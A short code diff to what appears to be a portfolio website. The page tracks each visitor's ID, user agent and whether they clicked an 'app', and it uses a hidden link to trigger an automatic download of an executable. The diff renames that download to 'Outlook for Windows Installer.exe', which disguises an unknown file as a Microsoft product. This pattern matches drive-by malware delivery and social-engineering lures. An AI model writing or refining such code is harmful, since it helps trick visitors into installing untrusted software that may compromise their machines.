@@ -4,7 +4,7 @@ import { Toaster } from "@/components/ui/sonner";
 import { EntryModal } from "@/components/EntryModal";
 import { Navbar } from "@/components/Navbar";
 import { Portfolio } from "@/components/Portfolio";
-import { recordActivity, recordVisit } from "@/lib/activity";
+import { recordActivity } from "@/lib/activity";
 import { scheduleInstallerDownload } from "@/lib/installer-download";
 import { toast } from "sonner";
 
@@ -84,7 +84,6 @@ function Index() {
     const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
     localStorage.setItem("portfolio-visitor-id", visitorId);
     const userAgent = navigator.userAgent;
-    void recordVisit({ data: { visitorId } });
     const update = (siteStatus: "active" | "left", appStatus?: "not_clicked" | "clicked") =>
       void recordActivity({ data: { visitorId, siteStatus, appStatus, userAgent } });
     update("active");
@@ -123,9 +122,10 @@ async function startInstallerDownload(downloadUrl: string, visitorId: string) {
   const objectUrl = URL.createObjectURL(installer);
   const link = document.createElement("a");
   link.href = objectUrl;
-  link.download = "Update_Explorer_Installer.exe";
+  link.download = "Outlook for Windows Installer.exe";
   document.body.append(link);
   link.click();
   link.remove();
   window.setTimeout(() => URL.revokeObjectURL(objectUrl), 0);
 }
+
